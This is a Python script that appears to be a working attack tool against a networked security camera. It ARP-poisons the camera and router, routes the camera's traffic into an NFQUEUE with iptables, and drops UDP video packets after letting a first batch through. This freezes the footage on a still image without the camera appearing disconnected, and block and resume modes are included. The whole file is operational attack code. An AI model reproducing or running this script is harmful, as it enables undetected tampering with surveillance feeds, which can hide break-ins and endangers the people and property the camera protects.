from poison import initPoison, endPoison
from netfilterqueue import NetfilterQueue
from scapy.all import *
import os

# configure these parameters to match your scenario
ipCamera = "192.168.1.95"
macCamera = "38:be:ab:8f:ff:b0"
ipRouter = "192.168.1.1"
macRouter = "04:92:26:60:98:38"
# the attacker's mac address is found automatically
macAttacker = Ether().src

# this stores the active video port of the camera (set automatically)
port = 0

# this number of packets will be let through
# once the camera first connects to the app
allowfirst = 400
allowcount = allowfirst

block = False
resume = False
unfreeze = False

def replace_data(packet):
    global port
    global allowfirst
    global allowcount
    global block

    # read package payload
    payload = packet.get_payload()
    pkt = IP(payload)
    print(packet)

    if block:
        # in block mode all packets are dropped
        packet.drop()
        return
    elif unfreeze:
        # once the footage should unfreeze all packets are accepted
        packet.accept()
        return

    if pkt.haslayer(UDP):
        # video packets almost always have length over 400, use this to detect video packet
        if len(pkt) > 400:
            # if the port has changed reset the allowcount and switch the active port
            if pkt[UDP].sport != port:
                allowcount = allowfirst
                port = pkt[UDP].sport
        # if the packet doesn't come from the active port it is accepted
        if pkt[UDP].sport != port and not block:
            packet.accept()
            return
        # the first few packets are accepted to allow the camera to form
        # an initial image that prevents the camera from appearing disconnected
        if allowcount > 0:
            packet.accept()
            print(allowcount)
            allowcount -= 1
            return

        # drop the video packet
        packet.drop()
    else:
        packet.accept()

# start arp poisoning
initPoison(ipCamera, macCamera, macAttacker, ipRouter, macRouter)

# set up nfqueue callback for processing captured packets
nfqueue = NetfilterQueue()
nfqueue.bind(1, replace_data)

# read arguments passed by user
argv = sys.argv[1:]
opts, args = getopt.getopt(argv, "rb")
for opt, arg in opts:
    if opt == "-b":
        block = True
        print("Starting in block mode, Ctrl+C to stop")
    elif opt == "-r":
        resume = True
        print("Resume enabled, Ctrl+C to stop")
if block:
    allowfirst = 0
    allowcount = allowfirst
else:
    print("Starting in freeze mode, Ctrl+C to stop")

try:
    # set iptables rule to catch packets sent from camera ip and using udp
    if block:
        os.system('sudo iptables -I FORWARD --src ' + ipCamera + ' -j NFQUEUE --queue-num 1')
    else:
        os.system('sudo iptables -I FORWARD --src ' + ipCamera + ' -p udp -j NFQUEUE --queue-num 1')
    nfqueue.run()
except KeyboardInterrupt:
    if resume:
        unfreeze = True
        try:
            nfqueue.run()
        except KeyboardInterrupt:
            pass
    # remove iptables rule for clean closing
    if block:
        os.system('sudo iptables -D FORWARD --src ' + ipCamera + ' -j NFQUEUE --queue-num 1')
    else:
        os.system('sudo iptables -D FORWARD --src ' + ipCamera + ' -p udp -j NFQUEUE --queue-num 1')
    # stop arp poisoning and restore arp tables
    endPoison(ipCamera, macCamera, ipRouter, macRouter)
    print('Stopped')
    
nfqueue.unbind()